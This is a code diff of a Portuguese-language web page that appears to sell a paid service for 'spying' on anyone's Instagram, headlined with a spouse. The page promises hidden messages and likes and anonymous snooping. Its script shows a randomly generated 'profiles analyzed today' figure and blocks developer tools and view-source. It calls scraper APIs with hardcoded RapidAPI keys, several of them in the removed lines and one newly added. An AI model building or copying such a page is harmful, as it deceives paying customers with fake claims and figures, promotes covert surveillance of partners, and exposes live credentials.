@@ -79,212 +79,60 @@ input[type=text]::placeholder{color:#6b7280;font-weight:400}
 .typewriter-cursor{display:inline-block;width:2px;height:1em;background:linear-gradient(135deg,#4a37b6,#ab58f4);margin-left:2px;vertical-align:middle;animation:cursorBlink .8s steps(1) infinite}
 @keyframes cursorBlink{0%,50%{opacity:1}51%,100%{opacity:0}}
 
-/* ============================================
-   🚫 MODAL — Limite de pesquisas atingido
-   ============================================ */
-.vs-modal-backdrop{
-  position:fixed;inset:0;z-index:99999;
-  background:rgba(0,0,0,.8);
-  backdrop-filter:blur(10px);
-  -webkit-backdrop-filter:blur(10px);
-  display:none;align-items:center;justify-content:center;
-  padding:20px;
-  animation:vsFadeIn .3s ease-out;
-  overflow-y:auto;
-}
+.vs-modal-backdrop{position:fixed;inset:0;z-index:99999;background:rgba(0,0,0,.8);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);display:none;align-items:center;justify-content:center;padding:20px;animation:vsFadeIn .3s ease-out;overflow-y:auto;}
 .vs-modal-backdrop.show{display:flex;}
 @keyframes vsFadeIn{from{opacity:0}to{opacity:1}}
-
-.vs-modal{
-  width:100%;max-width:400px;
-  background:linear-gradient(160deg,rgba(20,16,40,.98) 0%,rgba(28,20,58,.98) 100%);
-  border:1px solid rgba(168,85,247,.35);
-  border-radius:24px;
-  padding:28px 24px 24px;
-  text-align:center;
-  box-shadow:0 20px 60px rgba(0,0,0,.6),0 0 60px rgba(124,58,237,.25),inset 0 1px 0 rgba(255,255,255,.1);
-  position:relative;overflow:hidden;
-  animation:vsPopIn .4s cubic-bezier(.34,1.56,.64,1);
-  margin:auto;
-}
+.vs-modal{width:100%;max-width:400px;background:linear-gradient(160deg,rgba(20,16,40,.98) 0%,rgba(28,20,58,.98) 100%);border:1px solid rgba(168,85,247,.35);border-radius:24px;padding:28px 24px 24px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.6),0 0 60px rgba(124,58,237,.25),inset 0 1px 0 rgba(255,255,255,.1);position:relative;overflow:hidden;animation:vsPopIn .4s cubic-bezier(.34,1.56,.64,1);margin:auto;}
 @keyframes vsPopIn{from{opacity:0;transform:scale(.85) translateY(20px)}to{opacity:1;transform:scale(1) translateY(0)}}
-
-.vs-modal::before{
-  content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;
-  background:radial-gradient(circle,rgba(168,85,247,.15) 0%,transparent 60%);
-  pointer-events:none;animation:vsRotateGlow 10s linear infinite;
-}
+.vs-modal::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle,rgba(168,85,247,.15) 0%,transparent 60%);pointer-events:none;animation:vsRotateGlow 10s linear infinite;}
 @keyframes vsRotateGlow{to{transform:rotate(360deg)}}
-
-.vs-modal-icon{
-  width:72px;height:72px;margin:0 auto 18px;
-  border-radius:22px;
-  background:linear-gradient(135deg,#7c3aed 0%,#a855f7 100%);
-  display:flex;align-items:center;justify-content:center;
-  box-shadow:0 12px 36px rgba(124,58,237,.5),inset 0 1px 0 rgba(255,255,255,.3);
-  position:relative;z-index:1;
-}
+.vs-modal-icon{width:72px;height:72px;margin:0 auto 18px;border-radius:22px;background:linear-gradient(135deg,#7c3aed 0%,#a855f7 100%);display:flex;align-items:center;justify-content:center;box-shadow:0 12px 36px rgba(124,58,237,.5),inset 0 1px 0 rgba(255,255,255,.3);position:relative;z-index:1;}
 .vs-modal-icon svg{width:36px;height:36px;stroke:#fff;fill:none;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round}
-
-.vs-modal-title{
-  font-size:23px;font-weight:800;color:#fff;
-  margin-bottom:12px;letter-spacing:-.02em;line-height:1.2;
-  position:relative;z-index:1;
-}
-.vs-modal-title span{
-  background:linear-gradient(135deg,#a855f7 0%,#6366f1 100%);
-  -webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;
-}
-
-.vs-modal-desc{
-  font-size:14px;color:rgba(255,255,255,.75);
-  line-height:1.5;margin-bottom:20px;
-  position:relative;z-index:1;
-}
+.vs-modal-title{font-size:23px;font-weight:800;color:#fff;margin-bottom:12px;letter-spacing:-.02em;line-height:1.2;position:relative;z-index:1;}
+.vs-modal-title span{background:linear-gradient(135deg,#a855f7 0%,#6366f1 100%);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;}
+.vs-modal-desc{font-size:14px;color:rgba(255,255,255,.75);line-height:1.5;margin-bottom:20px;position:relative;z-index:1;}
 .vs-modal-desc b{color:#fff;font-weight:600;}
-
-.vs-modal-target{
-  display:flex;align-items:center;justify-content:center;gap:8px;
-  background:rgba(168,85,247,.08);
-  border:1px solid rgba(168,85,247,.25);
-  border-radius:14px;
-  padding:12px 14px;
-  margin-bottom:18px;
-  position:relative;z-index:1;
-  font-size:14px;color:rgba(255,255,255,.85);
-}
+.vs-modal-target{display:flex;align-items:center;justify-content:center;gap:8px;background:rgba(168,85,247,.08);border:1px solid rgba(168,85,247,.25);border-radius:14px;padding:12px 14px;margin-bottom:18px;position:relative;z-index:1;font-size:14px;color:rgba(255,255,255,.85);}
 .vs-modal-target b{color:#a855f7;font-weight:700;}
-.vs-modal-target img{
-  width:26px;height:26px;border-radius:50%;object-fit:cover;
-  border:1.5px solid rgba(168,85,247,.4);
-}
-
-.vs-modal-benefits{
-  text-align:left;
-  background:rgba(168,85,247,.06);
-  border:1px solid rgba(168,85,247,.15);
-  border-radius:14px;
-  padding:14px 16px;
-  margin-bottom:20px;
-  position:relative;z-index:1;
-}
-.vs-modal-benefit{
-  display:flex;align-items:center;gap:10px;
-  font-size:13px;color:rgba(255,255,255,.85);
-  padding:4px 0;
-}
-.vs-modal-benefit svg{
-  width:16px;height:16px;stroke:#a855f7;
-  fill:none;stroke-width:3;flex-shrink:0;
-}
-
-.vs-modal-price{
-  display:flex;flex-direction:column;align-items:center;
-  margin-bottom:20px;position:relative;z-index:1;
-}
-.vs-modal-price .old{
-  font-size:13px;color:rgba(255,255,255,.5);
-  text-decoration:line-through;margin-bottom:4px;
-}
-.vs-modal-price .new{
-  font-size:32px;font-weight:800;
-  background:linear-gradient(135deg,#a855f7 0%,#6366f1 100%);
-  -webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;
-  letter-spacing:-.02em;line-height:1;
-}
+.vs-modal-target img{width:26px;height:26px;border-radius:50%;object-fit:cover;border:1.5px solid rgba(168,85,247,.4);}
+.vs-modal-benefits{text-align:left;background:rgba(168,85,247,.06);border:1px solid rgba(168,85,247,.15);border-radius:14px;padding:14px 16px;margin-bottom:20px;position:relative;z-index:1;}
+.vs-modal-benefit{display:flex;align-items:center;gap:10px;font-size:13px;color:rgba(255,255,255,.85);padding:4px 0;}
+.vs-modal-benefit svg{width:16px;height:16px;stroke:#a855f7;fill:none;stroke-width:3;flex-shrink:0;}
+.vs-modal-price{display:flex;flex-direction:column;align-items:center;margin-bottom:20px;position:relative;z-index:1;}
+.vs-modal-price .old{font-size:13px;color:rgba(255,255,255,.5);text-decoration:line-through;margin-bottom:4px;}
+.vs-modal-price .new{font-size:32px;font-weight:800;background:linear-gradient(135deg,#a855f7 0%,#6366f1 100%);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:-.02em;line-height:1;}
 .vs-modal-price .new small{font-size:16px;font-weight:600;}
-
-.vs-modal-btn{
-  display:flex;align-items:center;justify-content:center;gap:8px;
-  width:100%;padding:16px;
-  border:none;border-radius:16px;
-  background:linear-gradient(135deg,#7c3aed 0%,#a855f7 100%);
-  color:#fff;font-size:16px;font-weight:800;
-  cursor:pointer;font-family:inherit;
-  box-shadow:0 12px 32px rgba(124,58,237,.5),inset 0 1px 0 rgba(255,255,255,.25);
-  transition:all .25s;position:relative;z-index:1;
-  animation:vsPulse 2s ease-in-out infinite;
-  text-transform:uppercase;letter-spacing:.03em;
-}
+.vs-modal-btn{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:16px;border:none;border-radius:16px;background:linear-gradient(135deg,#7c3aed 0%,#a855f7 100%);color:#fff;font-size:16px;font-weight:800;cursor:pointer;font-family:inherit;box-shadow:0 12px 32px rgba(124,58,237,.5),inset 0 1px 0 rgba(255,255,255,.25);transition:all .25s;position:relative;z-index:1;animation:vsPulse 2s ease-in-out infinite;text-transform:uppercase;letter-spacing:.03em;}
 .vs-modal-btn:hover{transform:translateY(-2px);box-shadow:0 16px 40px rgba(124,58,237,.65)}
 .vs-modal-btn:active{transform:scale(.98)}
 .vs-modal-btn svg{width:18px;height:18px;stroke:currentColor;fill:none;stroke-width:2.5}
-@keyframes vsPulse{
-  0%,100%{box-shadow:0 12px 32px rgba(124,58,237,.5),inset 0 1px 0 rgba(255,255,255,.25)}
-  50%{box-shadow:0 12px 32px rgba(124,58,237,.7),0 0 0 8px rgba(124,58,237,.15),inset 0 1px 0 rgba(255,255,255,.25)}
-}
-
-.vs-modal-cancel{
-  display:block;width:100%;padding:12px;
-  margin-top:10px;
-  background:transparent;border:none;
-  color:rgba(255,255,255,.5);
-  font-size:13px;font-weight:500;
-  cursor:pointer;font-family:inherit;
-  transition:color .2s;
-  position:relative;z-index:1;
-}
+@keyframes vsPulse{0%,100%{box-shadow:0 12px 32px rgba(124,58,237,.5),inset 0 1px 0 rgba(255,255,255,.25)}50%{box-shadow:0 12px 32px rgba(124,58,237,.7),0 0 0 8px rgba(124,58,237,.15),inset 0 1px 0 rgba(255,255,255,.25)}}
+.vs-modal-cancel{display:block;width:100%;padding:12px;margin-top:10px;background:transparent;border:none;color:rgba(255,255,255,.5);font-size:13px;font-weight:500;cursor:pointer;font-family:inherit;transition:color .2s;position:relative;z-index:1;}
 .vs-modal-cancel:hover{color:rgba(255,255,255,.8)}
-
-.vs-modal-timer{
-  font-size:11px;color:rgba(255,255,255,.4);
-  margin-top:14px;position:relative;z-index:1;
-}
 </style>
 </head>
 <body>
 <canvas id="matrix-canvas"></canvas>
 
-<!-- ============================================
-     💎 MODAL VIP
-     ============================================ -->
 <div class="vs-modal-backdrop" id="vsModal">
   <div class="vs-modal">
     <div class="vs-modal-icon">
-      <svg viewBox="0 0 24 24">
-        <path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
-      </svg>
+      <svg viewBox="0 0 24 24"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
     </div>
-
     <h2 class="vs-modal-title">Você já usou sua <span>pesquisa grátis</span></h2>
-
-    <p class="vs-modal-desc">
-      Para continuar espionando <b>@<span id="vsTargetName">usuario</span></b> e ver <b>todos os dados ocultos</b>, ative o acesso VIP agora.
-    </p>
-
+    <p class="vs-modal-desc">Para continuar espionando <b>@<span id="vsTargetName">usuario</span></b> e ver <b>todos os dados ocultos</b>, ative o acesso VIP agora.</p>
     <div class="vs-modal-target">
       <img id="vsTargetAvatar" src="" alt="" onerror="this.style.display='none'"/>
       <span>Você quer espionar: <b>@<span id="vsTargetName2">usuario</span></b></span>
     </div>
-
     <div class="vs-modal-benefits">
-      <div class="vs-modal-benefit">
-        <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg>
-        Acesso completo ao perfil
-      </div>
-      <div class="vs-modal-benefit">
-        <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg>
-        Mensagens e curtidas liberadas
-      </div>
-      <div class="vs-modal-benefit">
-        <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg>
-        100% anônimo — sem deixar rastros
-      </div>
+      <div class="vs-modal-benefit"><svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg>Acesso completo ao perfil</div>
+      <div class="vs-modal-benefit"><svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg>Mensagens e curtidas liberadas</div>
+      <div class="vs-modal-benefit"><svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg>100% anônimo — sem deixar rastros</div>
     </div>
-
-    <div class="vs-modal-price">
-      <span class="old">De R$ 279,90</span>
-      <span class="new">R$ 19,90</span>
-    </div>
-
-    <button class="vs-modal-btn" id="vsModalVip">
-      <svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
-      Desbloquear Acesso VIP
-    </button>
-
-    <button class="vs-modal-cancel" id="vsModalClose">
-      Voltar
-    </button>
+    <div class="vs-modal-price"><span class="old">De R$ 279,90</span><span class="new">R$ 19,90</span></div>
+    <button class="vs-modal-btn" id="vsModalVip"><svg viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>Desbloquear Acesso VIP</button>
+    <button class="vs-modal-cancel" id="vsModalClose">Voltar</button>
   </div>
 </div>
 
@@ -328,10 +176,7 @@ input[type=text]::placeholder{color:#6b7280;font-weight:400}
 <div class="error-box" id="error-box"></div>
 </div>
 <div id="u-loading" style="display:none">
-<div class="loading">
-<div class="spinner"></div>
-<p>Localizando @<span id="loading-user"></span>...</p>
-</div>
+<div class="loading"><div class="spinner"></div><p>Localizando @<span id="loading-user"></span>...</p></div>
 </div>
 <div id="u-confirm" style="display:none">
 <p class="title-p">Confirme o Instagram</p>
@@ -373,31 +218,20 @@ input[type=text]::placeholder{color:#6b7280;font-weight:400}
 </div>
 
 <script>
-/* ============================================================
-   🔒 PROTEÇÃO SILENCIOSA — bloqueia sem avisar
-   ============================================================ */
 (function(){
   document.addEventListener('contextmenu', (e) => { e.preventDefault(); return false; });
   document.addEventListener('keydown', (e) => {
     if (e.key === 'F12' || e.keyCode === 123) { e.preventDefault(); return false; }
-    if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C' || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) { e.preventDefault(); return false; }
-    if (e.ctrlKey && (e.key === 'U' || e.keyCode === 85)) { e.preventDefault(); return false; }
-    if (e.ctrlKey && (e.key === 'S' || e.keyCode === 83)) { e.preventDefault(); return false; }
-    if (e.ctrlKey && e.shiftKey && (e.key === 'K' || e.keyCode === 75)) { e.preventDefault(); return false; }
-    if (e.metaKey && e.altKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) { e.preventDefault(); return false; }
+    if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) { e.preventDefault(); return false; }
+    if (e.ctrlKey && (e.key === 'U' || e.key === 'S')) { e.preventDefault(); return false; }
   });
-  document.addEventListener('selectstart', (e) => { e.preventDefault(); return false; });
-  document.addEventListener('dragstart', (e) => { e.preventDefault(); return false; });
 })();
 
-/* ============================================================
-   MATRIX CANVAS
-   ============================================================ */
 (function(){
   const c=document.getElementById('matrix-canvas'),ctx=c.getContext('2d');
   let w,h,cols,drops;
   const fs=14;
-  const chars='STALKEA.AIアイウエオカキクケコサシスセソ0123456789'.split('');
+  const chars='VERISCANアイウエオカキクケコサシスセソ0123456789'.split('');
   function resize(){w=c.width=window.innerWidth;h=c.height=window.innerHeight;cols=Math.floor(w/fs);drops=new Array(cols).fill(1)}
   function draw(){
     ctx.fillStyle='rgba(4,6,7,0.08)';
@@ -416,29 +250,23 @@ input[type=text]::placeholder{color:#6b7280;font-weight:400}
   setInterval(draw,50);
 })();
 
-/* ============================================================
-   CONTADOR
-   ============================================================ */
 (function(){
-  const dias = ['domingo','segunda-feira','terça-feira','quarta-feira','quinta-feira','sexta-feira','sábado'];
-  const hoje = new Date();
-  const diaSemana = dias[hoje.getDay()];
-  const num = Math.floor(Math.random() * (98000 - 87000 + 1)) + 87000;
-  document.getElementById('contadorPerfis').textContent = '+' + num.toLocaleString('pt-BR');
-  document.getElementById('textoContador').textContent = 'perfis analisados hoje (' + diaSemana + ')';
+  const dias=['domingo','segunda-feira','terça-feira','quarta-feira','quinta-feira','sexta-feira','sábado'];
+  const hoje=new Date();
+  const diaSemana=dias[hoje.getDay()];
+  const num=Math.floor(Math.random()*(98000-87000+1))+87000;
+  document.getElementById('contadorPerfis').textContent='+'+num.toLocaleString('pt-BR');
+  document.getElementById('textoContador').textContent='perfis analisados hoje ('+diaSemana+')';
 })();
 
-/* ============================================================
-   TYPEWRITER
-   ============================================================ */
 (function(){
-  const tEl = document.getElementById('tituloTypewriter');
-  const sEl = document.getElementById('subTypewriter');
-  const tHTML = 'O que seu <span class="gradient-text">Cônjuge</span> faz<br>quando está no Instagram?';
-  const sHTML = 'Descubra a verdade sobre <span class="gradient-text" style="font-weight:600">qualquer pessoa</span>, acessando o instagram dela!';
-  const tTxt = tHTML.replace(/<[^>]+>/g,'');
-  const sTxt = sHTML.replace(/<[^>]+>/g,'');
-  const cur = '<span class="typewriter-cursor"></span>';
+  const tEl=document.getElementById('tituloTypewriter');
+  const sEl=document.getElementById('subTypewriter');
+  const tHTML='O que seu <span class="gradient-text">Cônjuge</span> faz<br>quando está no Instagram?';
+  const sHTML='Descubra a verdade sobre <span class="gradient-text" style="font-weight:600">qualquer pessoa</span>, acessando o instagram dela!';
+  const tTxt=tHTML.replace(/<[^>]+>/g,'');
+  const sTxt=sHTML.replace(/<[^>]+>/g,'');
+  const cur='<span class="typewriter-cursor"></span>';
   function render(h,t,idx){
     let v=0,r='',i=0;
     while(i<h.length && v<idx){
@@ -458,224 +286,105 @@ input[type=text]::placeholder{color:#6b7280;font-weight:400}
   dig(tHTML,tTxt,tEl,55,()=>dig(sHTML,sTxt,sEl,30));
 })();
 
-/* ============================================================
-   🚦 CONTROLE DE PESQUISA — localStorage + Cookie
-   ============================================================ */
-const _cfg = (() => { try { return JSON.parse(localStorage.getItem('vs_admin_config') || '{}'); } catch(e) { return {}; } })();
-const LIMITE_MINUTOS = _cfg.limiteMinutos ?? 15;
-const CHAVE_LS = 'vs_pesq_ts';
-const CHAVE_CK = 'vs_pesq';
-const CHAVE_LAST_USER = 'vs_last_user';
+const _cfg=(()=>{try{return JSON.parse(localStorage.getItem('vs_admin_config')||'{}');}catch(e){return {};}})();
+const LIMITE_MINUTOS=_cfg.limiteMinutos??15;
+const CHAVE_LS='vs_pesq_ts';
+const CHAVE_CK='vs_pesq';
+const CHAVE_LAST_USER='vs_last_user';
 
-function setCookie(nome, valor, minutos) {
-  const d = new Date();
-  d.setTime(d.getTime() + minutos * 60 * 1000);
-  document.cookie = nome + '=' + valor + '; expires=' + d.toUTCString() + '; path=/; SameSite=Lax';
-}
-function getCookie(nome) {
-  const match = document.cookie.match(new RegExp('(^|;\\s*)' + nome + '=([^;]*)'));
-  return match ? decodeURIComponent(match[2]) : null;
-}
-function apagarCookie(nome) {
-  document.cookie = nome + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
-}
+function setCookie(nome,valor,minutos){const d=new Date();d.setTime(d.getTime()+minutos*60*1000);document.cookie=nome+'='+valor+'; expires='+d.toUTCString()+'; path=/; SameSite=Lax';}
+function getCookie(nome){const match=document.cookie.match(new RegExp('(^|;\\s*)'+nome+'=([^;]*)'));return match?decodeURIComponent(match[2]):null;}
+function apagarCookie(nome){document.cookie=nome+'=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';}
 
-function podePesquisar() {
-  const agora = Date.now();
-  const limite = LIMITE_MINUTOS * 60 * 1000;
-  let tsLS = 0, tsCK = 0;
-  try { tsLS = parseInt(localStorage.getItem(CHAVE_LS) || '0', 10); } catch(e){}
-  const ckVal = getCookie(CHAVE_CK);
-  tsCK = ckVal ? parseInt(ckVal, 10) : 0;
-  const ts = Math.max(tsLS, tsCK);
-  if (!ts) return { ok: true };
-  const passou = agora - ts;
-  if (passou >= limite) {
-    try { localStorage.removeItem(CHAVE_LS); } catch(e){}
-    apagarCookie(CHAVE_CK);
-    return { ok: true };
-  }
-  return { ok: false };
+function podePesquisar(){
+  const agora=Date.now();
+  const limite=LIMITE_MINUTOS*60*1000;
+  let tsLS=0,tsCK=0;
+  try{tsLS=parseInt(localStorage.getItem(CHAVE_LS)||'0',10);}catch(e){}
+  const ckVal=getCookie(CHAVE_CK);
+  tsCK=ckVal?parseInt(ckVal,10):0;
+  const ts=Math.max(tsLS,tsCK);
+  if(!ts)return{ok:true};
+  const passou=agora-ts;
+  if(passou>=limite){try{localStorage.removeItem(CHAVE_LS);}catch(e){}apagarCookie(CHAVE_CK);return{ok:true};}
+  return{ok:false};
 }
-function marcarPesquisa() {
-  const ts = String(Date.now());
-  try { localStorage.setItem(CHAVE_LS, ts); } catch(e){}
-  setCookie(CHAVE_CK, ts, LIMITE_MINUTOS);
-}
+function marcarPesquisa(){const ts=String(Date.now());try{localStorage.setItem(CHAVE_LS,ts);}catch(e){}setCookie(CHAVE_CK,ts,LIMITE_MINUTOS);}
 
-/* ============================================================
-   💎 MODAL VIP
-   ============================================================ */
-function mostrarModalVIP() {
-  let ultimoUser = 'usuario';
-  let ultimoPerfil = {};
-  try {
-    ultimoUser = localStorage.getItem(CHAVE_LAST_USER) || 'usuario';
-    ultimoPerfil = JSON.parse(localStorage.getItem('stalkea_profile') || '{}');
-  } catch(e){}
-  document.getElementById('vsTargetName').textContent = ultimoUser;
-  document.getElementById('vsTargetName2').textContent = ultimoUser;
-  const avatarEl = document.getElementById('vsTargetAvatar');
-  avatarEl.src = ultimoPerfil.profile_pic_url || 'https://unavatar.io/instagram/' + ultimoUser;
-  avatarEl.onerror = () => { avatarEl.style.display = 'none'; };
+function mostrarModalVIP(){
+  let ultimoUser='usuario';
+  let ultimoPerfil={};
+  try{ultimoUser=localStorage.getItem(CHAVE_LAST_USER)||'usuario';ultimoPerfil=JSON.parse(localStorage.getItem('stalkea_profile')||'{}');}catch(e){}
+  document.getElementById('vsTargetName').textContent=ultimoUser;
+  document.getElementById('vsTargetName2').textContent=ultimoUser;
+  const avatarEl=document.getElementById('vsTargetAvatar');
+  avatarEl.src=ultimoPerfil.profile_pic_url||'https://unavatar.io/instagram/'+ultimoUser;
+  avatarEl.onerror=()=>{avatarEl.style.display='none';};
   document.getElementById('vsModal').classList.add('show');
-  document.body.style.overflow = 'hidden';
+  document.body.style.overflow='hidden';
 }
-function fecharModalVIP() {
-  document.getElementById('vsModal').classList.remove('show');
-  document.body.style.overflow = '';
-}
-document.getElementById('vsModalClose').addEventListener('click', fecharModalVIP);
-document.getElementById('vsModal').addEventListener('click', (e) => {
-  if (e.target === e.currentTarget) fecharModalVIP();
-});
-document.getElementById('vsModalVip').addEventListener('click', () => {
-  let ultimoUser = 'usuario';
-  try { ultimoUser = localStorage.getItem(CHAVE_LAST_USER) || 'usuario'; } catch(e){}
-  window.location.href = '/checkout?u=' + encodeURIComponent(ultimoUser);
+function fecharModalVIP(){document.getElementById('vsModal').classList.remove('show');document.body.style.overflow='';}
+document.getElementById('vsModalClose').addEventListener('click',fecharModalVIP);
+document.getElementById('vsModal').addEventListener('click',(e)=>{if(e.target===e.currentTarget)fecharModalVIP();});
+document.getElementById('vsModalVip').addEventListener('click',()=>{
+  let ultimoUser='usuario';
+  try{ultimoUser=localStorage.getItem(CHAVE_LAST_USER)||'usuario';}catch(e){}
+  window.location.href='/checkout?u='+encodeURIComponent(ultimoUser);
 });
 
 /* ============================================================
-   🔄 APIs EM CASCATA
+   API — instagram-api-fast-reliable-data-scraper (RapidAPI)
    ============================================================ */
-const APIS = [
-  // ---------- API 1 — Looter MCP (chave NOVA — 7a07) ----------
-  {
-    nome: 'Looter MCP',
-    host: 'instagram-looter2.p.rapidapi.com',
-    key:  '7a070fd1a9msh1a1af5525cd1809p18c80ejsne01b17a77fdc',
-    buildUrl: (u) => `https://instagram-looter2.p.rapidapi.com/profile2?username=${encodeURIComponent(u)}`
-  },
-  // ---------- API 2 — Looter Nova (chave 950e) ----------
-  {
-    nome: 'Looter Nova',
-    host: 'instagram-looter2.p.rapidapi.com',
-    key:  '950eac8e3cmsh6ffa910eedbc232p1928f0jsnd7fe057ba05b',
-    buildUrl: (u) => `https://instagram-looter2.p.rapidapi.com/profile2?username=${encodeURIComponent(u)}`
-  },
-  // ---------- API 3 — Looter 223f ----------
-  {
-    nome: 'Looter 223f',
-    host: 'instagram-looter2.p.rapidapi.com',
-    key:  '223f5f17a8mshd2346639777aea7p15b3d6jsn6e6a3424645b',
-    buildUrl: (u) => `https://instagram-looter2.p.rapidapi.com/profile2?username=${encodeURIComponent(u)}`
-  },
-  // ---------- API 4 — Stable ----------
-  {
-    nome: 'Stable',
-    host: 'instagram-scraper-stable-api.p.rapidapi.com',
-    key:  'cd0089e6c8msh1618a66089e0734p18a81ejsn7028d767d6fe',
-    buildUrl: (u) => `https://instagram-scraper-stable-api.p.rapidapi.com/ig_get_fb_profile_hover.php?username_or_url=${encodeURIComponent(u)}`
-  },
-  // ---------- API 5 — Looter 616c ----------
-  {
-    nome: 'Looter 616c',
-    host: 'instagram-looter2.p.rapidapi.com',
-    key:  '616c6d0667mshadf757fba9cc993p176c9djsn862a5812f871',
-    buildUrl: (u) => `https://instagram-looter2.p.rapidapi.com/profile2?username=${encodeURIComponent(u)}`
-  },
-  // ---------- API 6 — Looter Antiga ----------
-  {
-    nome: 'Looter Antiga',
-    host: 'instagram-looter2.p.rapidapi.com',
-    key:  'e3cd2d0d2fmsh0dced0acd30a539p1c7338jsn42c4ecbbcca6',
-    buildUrl: (u) => `https://instagram-looter2.p.rapidapi.com/profile2?username=${encodeURIComponent(u)}`
-  }
-];
+const API_HOST = 'instagram-api-fast-reliable-data-scraper.p.rapidapi.com';
+const API_KEY  = '65b61f0018msh751b1091ecaf443p1f8847jsn99bfb1b7be1e';
 
-let API_OK = null;
-try {
-  const saved = localStorage.getItem('ig_api_ok');
-  if (saved) API_OK = JSON.parse(saved);
-} catch(e){}
-
-async function tentarAPI(api, username) {
-  const url = api.buildUrl(username);
+async function buscar(u) {
   try {
+    const url = 'https://' + API_HOST + '/v1/info?username_or_id_or_url=' + encodeURIComponent(u);
     const r = await fetch(url, {
       method: 'GET',
       headers: {
-        'x-rapidapi-host': api.host,
-        'x-rapidapi-key':  api.key
+        'x-rapidapi-host': API_HOST,
+        'x-rapidapi-key':  API_KEY
       }
     });
-    if (r.status === 429 || r.status === 403 || r.status === 401) {
-      console.warn(`[${api.nome}] ❌ HTTP ${r.status}`);
+    if (!r.ok) {
+      console.warn('[API] HTTP', r.status);
       return null;
     }
-    if (!r.ok) { console.warn(`[${api.nome}] ❌ HTTP ${r.status}`); return null; }
     const d = await r.json();
-    if (d.error || d.message) { console.warn(`[${api.nome}] ❌`, d.error || d.message); return null; }
     const user = d.user_data || (d.data && d.data.user) || d.data || d;
-    if (user && (user.username || user.pk || user.id || user.full_name)) {
-      console.log(`✅ [${api.nome}] OK`);
-      return user;
+    if (!user || (!user.username && !user.pk && !user.id)) {
+      console.warn('[API] formato inválido', d);
+      return null;
     }
-    console.warn(`[${api.nome}] ❌ formato inválido`);
-    return null;
+    return normalizar(user, u);
   } catch (e) {
-    console.warn(`[${api.nome}] ❌ erro rede:`, e.message);
+    console.warn('[API] erro rede:', e.message);
     return null;
   }
 }
 
-async function buscar(u) {
-  if (API_OK) {
-    const api = APIS.find(a => a.nome === API_OK.nome);
-    if (api) {
-      const r = await tentarAPI(api, u);
-      if (r) { console.log('✅ API salva:', api.nome); return normalizar(r, u); }
-    }
-    try { localStorage.removeItem('ig_api_ok'); } catch(e){}
-    API_OK = null;
-  }
-  console.log('🔄 Testando APIs em cascata...');
-  for (const api of APIS) {
-    console.log(`  → tentando [${api.nome}]`);
-    const r = await tentarAPI(api, u);
-    if (r) {
-      API_OK = { nome: api.nome };
-      try { localStorage.setItem('ig_api_ok', JSON.stringify(API_OK)); } catch(e){}
-      console.log('🎯 API ESCOLHIDA:', api.nome);
-      return normalizar(r, u);
-    }
-  }
-  console.warn('❌ Todas as APIs falharam');
-  return null;
-}
-
-/* ============================================================
-   NORMALIZA
-   ============================================================ */
-function normalizar(user, usernameFallback) {
+function normalizar(user, fallback) {
   const u = user.user || (user.data && user.data.user) || user;
-
   let foto = '';
   if (typeof u.profile_pic_url === 'string' && u.profile_pic_url.startsWith('http')) foto = u.profile_pic_url;
   else if (u.hd_profile_pic_url_info && u.hd_profile_pic_url_info.url) foto = u.hd_profile_pic_url_info.url;
   else if (u.profile_pic_url_hd && typeof u.profile_pic_url_hd === 'string') foto = u.profile_pic_url_hd;
   else if (u.profile_picture && typeof u.profile_picture === 'string') foto = u.profile_picture;
-  else foto = 'https://unavatar.io/instagram/' + usernameFallback;
+  else foto = 'https://unavatar.io/instagram/' + fallback;
 
-  const bioRaw =
-    u.biography || u.bio || u.about || u.description ||
-    u.biography_text || u.bio_text || u.about_biography ||
-    u.edge_about || u.user?.biography || u.user?.bio || '';
-  const bio = (typeof bioRaw === 'string' && bioRaw.trim() && bioRaw.trim() !== 'null') ? bioRaw.trim() : '';
-
-  const seguidores = u.follower_count || u.followers_count || u.followers || u.edge_followed_by?.count || 0;
-  const seguindo   = u.following_count || u.following || u.edge_follow?.count || 0;
-  const posts      = u.media_count || u.posts_count || u.posts || u.edge_owner_to_timeline_media?.count || 0;
-  const nome       = u.full_name || u.name || u.username || usernameFallback;
+  const bioRaw = u.biography || u.bio || u.about || u.description || '';
+  const bio = (typeof bioRaw === 'string' && bioRaw.trim()) ? bioRaw.trim() : '';
 
   return {
-    username:        u.username || usernameFallback,
-    full_name:       nome,
